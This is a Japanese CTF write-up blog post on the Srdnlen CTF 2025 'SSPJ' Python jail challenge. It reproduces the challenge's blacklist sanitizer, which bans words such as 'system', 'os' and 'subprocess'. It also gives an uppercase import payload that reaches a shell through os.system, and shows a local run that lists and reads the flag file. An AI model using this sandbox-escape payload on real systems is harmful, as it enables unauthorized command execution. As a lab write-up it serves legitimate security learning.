<!DOCTYPE html>
<html lang="ja"><script src="/starknote/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=starknote/livereload" data-no-instant defer></script><meta charset="utf-8"><meta name="generator" content="Hugo 0.140.1"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="color-scheme" content="light dark">
<meta name="supported-color-schemes" content="light dark">
<link rel="icon" href="/starknote/favicon.ico" type="image/x-icon"><title>Srdnlen CTF 2025&nbsp;&ndash;&nbsp;しゅたるくの備忘録</title><link rel="stylesheet" href="/starknote/css/core.min.964363afdd281b37186e8f4572a119b584b5c489e7df05c552d5060e2b193d16058787359b6405833d43f4fe66a8263f.css" integrity="sha384-lkNjr90oGzcYbo9FcqEZtYS1xInn3wXFUtUGDisZPRYFh4c1m2QFgz1D9P5mqCY/"><meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="Srdnlen CTF 2025" /><meta name="twitter:image" content="https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/srdnlen-ctf-2025/cover.png" /><meta property="og:type" content="article" />
<meta property="og:title" content="Srdnlen CTF 2025" />
<meta property="og:site_name" content="しゅたるくの備忘録" /><meta property="og:image" content="https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/srdnlen-ctf-2025/cover.png" /><body><section id="header">
    <div class="header wrap"><span class="header left-side"><a class="site home" href="/starknote/"><span class="site name">しゅたるくの備忘録</span></a></span>
        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/starknote/categories/">カテゴリ</a><a class="nav item" href="/starknote/tags/">タグ</a><a class="nav item" href="/starknote/about/">About</a><a class="nav item" href=""></a></nav></div></span></div></section><section id="content">
<div id="top" class="article-container"><section class="article header">
    <h1 class="article title">Srdnlen CTF 2025</h1><p class="article date">Jan 20, 2025</p></section><article class="article markdown-body"><p>2025/1/19 03:00(JST) - 2025/1/20 03:00(JST)で開催された Srdnlen CTF 2025 に参加した．</p>
<p>開催期間後に解いた問題をまとめる．</p>
<p><a href="https://ctf.srdnlen.it/"target="_blank" rel="noopener noreferrer">https://ctf.srdnlen.it/</a>
<a href="https://ctftime.org/event/2576"target="_blank" rel="noopener noreferrer">https://ctftime.org/event/2576</a></p>
<h2 id="misc">MISC</h2>
<h3 id="sspj">SSPJ</h3>
<blockquote>
<p>nc ~</p>
</blockquote>
<p>サニタイズされた任意のコマンドを実行できるPyjail, PyExec問題．いくつかのアルファベットや記号，単語は使えない．</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">SSPJ</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Welcome to the Super Secure Python Jail (SSPJ)!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;You can run your code here, but be careful not to break the rules...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">code</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">code_sanitizer</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Enter your data: &#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># I&#39;m so confident in my SSPJ that </span>
</span></span><span class="line"><span class="cl">        <span class="c1"># I don&#39;t even need to delete any globals/builtins</span>
</span></span><span class="line"><span class="cl">        <span class="n">exec</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">code</span><span class="p">,</span> <span class="nb">globals</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">code_sanitizer</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">code</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">code</span><span class="o">.</span><span class="n">isascii</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Alien material detected... Exiting.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">banned_chars</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># Why do you need these characters?</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;m&#34;</span><span class="p">,</span> <span class="s2">&#34;o&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">,</span> <span class="s2">&#34;q&#34;</span><span class="p">,</span> <span class="s2">&#34;b&#34;</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span><span class="p">,</span> <span class="s2">&#34;u&#34;</span><span class="p">,</span> <span class="s2">&#34;h&#34;</span><span class="p">,</span> <span class="s2">&#34;c&#34;</span><span class="p">,</span> <span class="s2">&#34;v&#34;</span><span class="p">,</span> <span class="s2">&#34;z&#34;</span><span class="p">,</span> <span class="s2">&#34;x&#34;</span><span class="p">,</span> <span class="s2">&#34;k&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">banned_digits</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># Why do you need these digits?</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;0&#34;</span><span class="p">,</span> <span class="s2">&#34;7&#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">banned_symbols</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># You don&#39;t need these...</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="s2">&#34;(&#34;</span><span class="p">,</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s2">&#34;=&#34;</span><span class="p">,</span> <span class="s2">&#34;{&#34;</span><span class="p">,</span> <span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;@&#34;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s2">&#34;[&#34;</span><span class="p">,</span> <span class="s2">&#34;`&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">banned_words</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># Oh no, you can&#39;t use these words!</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;globals&#34;</span><span class="p">,</span> <span class="s2">&#34;breakpoint&#34;</span><span class="p">,</span> <span class="s2">&#34;locals&#34;</span><span class="p">,</span> <span class="s2">&#34;self&#34;</span><span class="p">,</span> <span class="s2">&#34;system&#34;</span><span class="p">,</span> <span class="s2">&#34;open&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;eval&#34;</span><span class="p">,</span> <span class="s2">&#34;import&#34;</span><span class="p">,</span> <span class="s2">&#34;exec&#34;</span><span class="p">,</span> <span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="s2">&#34;os&#34;</span><span class="p">,</span> <span class="s2">&#34;subprocess&#34;</span><span class="p">,</span> <span class="s2">&#34;input&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;random&#34;</span><span class="p">,</span> <span class="s2">&#34;builtins&#34;</span><span class="p">,</span> <span class="s2">&#34;code_sanitizer&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">blacklist</span> <span class="o">=</span> <span class="n">banned_chars</span> <span class="o">+</span> <span class="n">banned_digits</span> <span class="o">+</span> <span class="n">banned_symbols</span> <span class="o">+</span> <span class="n">banned_words</span>
</span></span><span class="line"><span class="cl">        <span class="n">random</span><span class="o">.</span><span class="n">shuffle</span><span class="p">(</span><span class="n">blacklist</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">c</span><span class="p">:</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">code</span><span class="p">,</span> <span class="n">blacklist</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Are you trying to cheat me!? Emergency exit in progress.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">code</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</span></span></code></pre></div><p>Pyjail, PyExec問題では，<a href="https://shirajuki.js.org/blog/pyjail-cheatsheet"target="_blank" rel="noopener noreferrer">Pyjail Cheatsheet</a>によくまとまっている．
今回は，以下が使える．</p>
<pre tabindex="0"><code>from os import system as __getattr__; from __main__ import sh
</code></pre><p>アルファベットの小文字の一部がサニタイズされているため，そのままでは上手くいかない．全て大文字で上手くいく．</p>
<pre tabindex="0"><code>FROM OS IMPORT SYSTEM AS __GETATTR__; FROM __MAIN__ IMPORT SH
</code></pre><p>今回は，開催期間後にローカルで実行した様子を示す．</p>
<pre tabindex="0"><code>$ docker-compose up
$ nc 127.0.0.1 1717
Welcome to the Super Secure Python Jail (SSPJ)!
You can run your code here, but be careful not to break the rules...
Enter your data: FROM OS IMPORT SYSTEM AS __GETATTR__; FROM __MAIN__ IMPORT SH

ls
flag-5d67dabaeb377feb4e8f79f80dd546f9.txt
sspj.py

cat flag-5d67dabaeb377feb4e8f79f80dd546f9.txt
srdnlen{REDACTED}
</code></pre></article><section class="article labels"><a class="category" href="/starknote/categories/security/">Security</a><a class="category" href="/starknote/categories/programming/">Programming</a><a class="tag" href="/starknote/tags/ctf/">CTF</a><a class="tag" href="/starknote/tags/writeup/">writeup</a><a class="tag" href="/starknote/tags/srdnlen/">srdnlen</a></section><section class="article author"><img class="avatar" src="https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/stable-diffusion/immy.png" alt><p class="name">しゅたるく (Stark)</p><div class="details"><a class="item" href="https://github.com/stark2420" target="_blank" rel="noopener noreferrer"><span class="iconfont icon-github"></span>&nbsp;stark2420</a><a class="item" href="https://twitter.com/stark_puyo" target="_blank" rel="noopener noreferrer"><span class="iconfont icon-twitter"></span>&nbsp;@stark_puyo</a></div>
</section>
</div>

<button id="toggle-button" class="nomal-style">
  <h1>目次</h1>
</button>
<div id="toc-container" class="toc-container">
  
      <h2><a href="#top">目次</a></h2>
      <div id="toc" class="toc">
          <nav id="TableOfContents">
  <ul>
    <li><a href="#misc">MISC</a>
      <ul>
        <li><a href="#sspj">SSPJ</a></li>
      </ul>
    </li>
  </ul>
</nav>
      </div>
  
</div>

<script>
  
  document.querySelectorAll('.toc-container a').forEach(link => {
    link.addEventListener('click', function() {
      
      if (window.innerWidth < 1600) {
        
        const tocContainer = document.querySelector('.toc-container');
        if (tocContainer) {
          tocContainer.style.display = 'none';
        }
      }
    });
  });

  
  document.getElementById('toggle-button').addEventListener('click', function() {
    var toc = document.getElementById('toc-container');
    var button = document.getElementById('toggle-button');
    
    
    if (toc.style.display === 'none') {
      toc.style.display = 'block';
      button.innerHTML = '<h1>目次</h1>';  
    } else {
      toc.style.display = 'none';
      button.innerHTML = '<h1>目次</h1>';  
    }
  });

  function highlightActiveTocItem() {
    const tocItems = document.querySelectorAll('.toc a');

    tocItems.forEach(item => {
      const targetId = item.getAttribute('href').substring(1); 
      const targetElement = document.getElementById(targetId);

      if (targetElement) {
        const rect = targetElement.getBoundingClientRect();
        
        
        const isInViewport = rect.top <= 200 && rect.bottom > 0;

        if (isInViewport) {
          
          tocItems.forEach(item => {
            item.classList.remove('active');
          });
          
          item.classList.add('active');
        }
      }
    });
  }

  
  window.addEventListener('scroll', highlightActiveTocItem);
  document.addEventListener('DOMContentLoaded', highlightActiveTocItem);  
</script>

<div class="article bottom"><section class="article navigation"><p><a class="link" href="/starknote/post/katagaitai-ctf2025/"><span class="iconfont icon-article"></span>Katagaitai CTF2025</a></p><p><a class="link" href="/starknote/post/ctf/"><span class="iconfont icon-article"></span>CTF ツール まとめ</a></p></section><section class="article discussion"><div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "starknote" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a></section></div></section><section id="footer"><div class="footer-wrap">
    <p class="copyright">©2020 Notepadium.</p>
    <p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
        target="_blank" rel="noopener noreferrer">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
        target="_blank" rel="noopener noreferrer">Notepadium</a>
<a href='https://ipv6-test.com/validate.php?url=referer'
  ><img src='https://ipv6-test.com/button-ipv6-80x15.png' 
        alt='ipv6 ready' title='ipv6 ready' border='0' 
/></a>
</p></div></section><script defer type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-AMS-MML_HTMLorMML" integrity="sha384-e/4/LvThKH1gwzXhdbY2AsjR3rm7LHWyhIG5C0jiRfn8AN2eTN5ILeztWw0H9jmN" crossorigin="anonymous"></script>
        <script
            type="text/x-mathjax-config">MathJax.Hub.Config({ tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']] } });</script></body>

</html>